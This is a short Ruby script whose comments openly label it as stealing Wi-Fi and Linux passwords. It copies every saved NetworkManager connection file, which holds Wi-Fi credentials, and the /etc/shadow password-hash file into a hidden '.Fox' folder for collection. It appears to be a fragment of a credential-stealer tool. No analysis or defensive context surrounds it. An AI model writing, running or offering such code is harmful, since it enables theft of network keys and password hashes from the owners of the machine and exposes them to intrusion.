### Steal WIFI Password On Linux ###
files = Dir.entries("/etc/NetworkManager/system-connections/").select { |f| File.file? File.join("/etc/NetworkManager/system-connections/", f) }
Dir.mkdir(".Fox")
num = 1
for line in files
  data_read = File.read("/etc/NetworkManager/system-connections/#{line}")
  File.open(".Fox/WIFI-#{num}.txt", "w") do |word|
    word.puts data_read
  end
  num += 1
end

### Steal Linux Password ###
os_pass = File.read("/etc/shadow")
File.open(".Fox/OS_Pass.txt", "w") do |line|
  line.puts os_pass
end
